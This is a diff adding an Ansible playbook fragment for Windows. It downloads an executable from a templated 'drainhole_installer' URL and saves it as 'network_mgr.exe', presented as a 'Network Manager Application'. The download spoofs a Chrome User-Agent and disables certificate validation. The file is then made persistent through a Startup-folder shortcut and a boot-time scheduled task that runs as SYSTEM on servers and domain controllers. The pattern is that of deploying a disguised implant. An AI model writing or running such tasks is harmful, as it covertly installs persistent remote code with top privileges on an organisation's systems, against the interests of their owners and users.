@@ -1,0 +1,43 @@
+---
+- name: Ensure Install Directory Exists
+  ansible.windows.win_file:
+    path: "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"
+    state: directory
+  when: ansible_os_product_type == "workstation"
+
+- name: Download network_mgr
+  ansible.windows.win_get_url:
+    url: "{{ drainhole_installer }}"
+    dest: "C:\\Program Files\\network_mgr.exe"
+    method: GET
+    follow_redirects: all
+    use_proxy: yes
+    proxy_url: "http://{{ inet_proxy_addr }}:{{ inet_proxy_port }}"
+    proxy_use_default_credential: yes
+    timeout: 300
+    validate_certs: no
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
+
+- name: Create startup shortcut (workstations only)
+  community.windows.win_shortcut:
+    src: "C:\\Program Files\\network_mgr.exe"
+    dest: "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\network_mgr.lnk"
+    description: "Network Manager Application"
+    state: present
+  when: ansible_os_product_type == "workstation"
+
+- name: Create scheduled task (servers only)
+  community.windows.win_scheduled_task:
+    name: NetworkManager
+    description: Network Manager Application
+    actions:
+    - path: C:\Program Files\network_mgr.exe
+    triggers:
+    - type: boot
+    execution_time_limit: PT0S
+    username: SYSTEM
+    runlevel: highest
+    state: present
+  when: ansible_os_product_type in ["server", "domain_controller"]
+  notify: Reboot Windows
